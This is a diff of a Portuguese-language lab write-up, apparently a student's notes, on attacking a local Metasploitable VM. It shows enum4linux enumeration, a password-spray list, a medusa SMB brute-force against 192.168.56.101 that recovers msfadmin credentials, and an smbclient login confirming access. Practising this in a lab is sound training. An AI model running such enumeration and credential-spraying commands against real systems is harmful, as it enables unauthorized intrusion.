@@ -72,6 +72,7 @@ Login: admin
 Senha: password
 
 |SIMULANDO UM CENÁRIO CORPORATIVO
+
 enum4linux -a 192.168.56.101 | tee enum4_output.txt
 
 Mas o meu tinha dado erro e não tinha compreendido.Até que percebi que meu METASPLOIT estava desligado e irregular.Loguei novamente e recomecei meu código do zero.E assim, dei continuidade.
@@ -87,8 +88,18 @@ echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
 medusa -h 1192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
 
 Fazendo o mesmo tipo de ataque de rede, focado no Cenário Corporativo . O que me deu acesso ao login e a password. Buscando novamente o [ACOUNT FOUND]. 
+
 login: msfadmin
 password : msfadmin
 
+| CONFIRMANDO O ATAQUE 
 
 smbclient -L //192.168.56.101 -U msfadmin
+
+E assim pediu o "user" e a "password" e eu coloquei a que foi informada a mim.
+
+login: msfadmin
+password : msfadmin
+
+O que confirmou que o meu ataque deu certo e foi feito de maneira bem sucedida.
+
